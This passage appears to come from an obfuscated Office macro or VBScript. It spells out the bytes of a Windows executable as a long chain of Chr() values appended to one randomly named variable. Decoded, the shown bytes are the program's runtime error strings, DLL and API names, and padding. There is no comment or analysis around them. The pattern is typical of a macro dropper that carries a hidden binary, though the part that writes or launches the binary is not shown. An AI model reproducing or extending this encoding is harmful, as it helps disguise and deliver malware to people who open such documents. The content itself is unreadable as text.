GqnqCn=GqnqCn&Chr(73)&Chr(78)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(52)&Chr(13)&Chr(10)&Chr(65)&Chr(110)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(109)&Chr(97)&Chr(100)&Chr(101)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(108)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(32)&Chr(105)&Chr(110)&Chr(99)&Chr(111)&Chr(114)&Chr(114)&Chr(101)&Chr(99)&Chr(116)&Chr(108)&Chr(121)&Chr(46)
GqnqCn=GqnqCn&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(51)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(117)&Chr(115)&Chr(101)&Chr(32)
GqnqCn=GqnqCn&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(116)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(100)&Chr(117)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)
GqnqCn=GqnqCn&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(32)&Chr(73)&Chr(116)&Chr(32)&Chr(105)&Chr(115)&Chr(32)&Chr(109)&Chr(111)&Chr(115)&Chr(116)&Chr(32)&Chr(108)&Chr(105)&Chr(107)&Chr(101)&Chr(108)&Chr(121)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(117)&Chr(108)&Chr(116)&Chr(32)&Chr(111)&Chr(102)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(112)&Chr(105)&Chr(108)&Chr(101)&Chr(100)&Chr(32)&Chr(40)&Chr(47)&Chr(99)&Chr(108)&Chr(114)&Chr(41)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(116)&Chr(114)&Chr(117)&Chr(99)
GqnqCn=GqnqCn&Chr(116)&Chr(111)&Chr(114)&Chr(32)&Chr(111)&Chr(114)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(68)&Chr(108)&Chr(108)&Chr(77)&Chr(97)&Chr(105)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(49)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)
GqnqCn=GqnqCn&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(97)&Chr(110)&Chr(32)&Chr(111)&Chr(110)&Chr(99)&Chr(101)&Chr(46)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(48)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(105)
GqnqCn=GqnqCn&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(119)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)
GqnqCn=GqnqCn&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(115)&Chr(116)&Chr(100)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(53)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(112)&Chr(117)&Chr(114)&Chr(101)&Chr(32)&Chr(118)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(13)
GqnqCn=GqnqCn&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(52)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(95)&Chr(111)&Chr(110)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(47)&Chr(97)&Chr(116)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(32)&Chr(116)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(111)&Chr(112)&Chr(101)&Chr(110)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(111)&Chr(108)&Chr(101)&Chr(32)&Chr(100)&Chr(101)&Chr(118)&Chr(105)&Chr(99)&Chr(101)&Chr(13)&Chr(10)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)
GqnqCn=GqnqCn&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(13)&Chr(10)&Chr(0)&Chr(13)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(116)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(105)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(117)
GqnqCn=GqnqCn&Chr(110)&Chr(117)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(119)&Chr(97)&Chr(121)&Chr(46)&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)
GqnqCn=GqnqCn&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(101)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(13)&Chr(10)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(97)&Chr(114)&Chr(103)&Chr(117)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(115)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(102)&Chr(108)&Chr(111)&Chr(97)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(112)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)
GqnqCn=GqnqCn&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(32)&Chr(86)&Chr(105)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(67)&Chr(43)&Chr(43)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(10)&Chr(0)&Chr(0)&Chr(46)&Chr(46)&Chr(46)&Chr(0)&Chr(60)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(117)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)&Chr(62)&Chr(0)&Chr(0)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)
GqnqCn=GqnqCn&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(33)&Chr(10)&Chr(10)&Chr(80)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(58)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(0)&Chr(0)&Chr(192)
GqnqCn=GqnqCn&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(69)&Chr(110)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(75)&Chr(0)&Chr(69)&Chr(0)&Chr(82)&Chr(0)&Chr(78)&Chr(0)&Chr(69)&Chr(0)&Chr(76)&Chr(0)&Chr(51)&Chr(0)&Chr(50)&Chr(0)&Chr(46)&Chr(0)&Chr(68)&Chr(0)&Chr(76)&Chr(0)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)
GqnqCn=GqnqCn&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)
GqnqCn=GqnqCn&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(80)&Chr(111)&Chr(112)&Chr(117)&Chr(112)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(0)&Chr(77)&Chr(101)&Chr(115)&Chr(115)&Chr(97)&Chr(103)&Chr(101)&Chr(66)&Chr(111)&Chr(120)&Chr(65)&Chr(0)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(51)&Chr(50)&Chr(46)&Chr(68)&Chr(76)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)
GqnqCn=GqnqCn&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
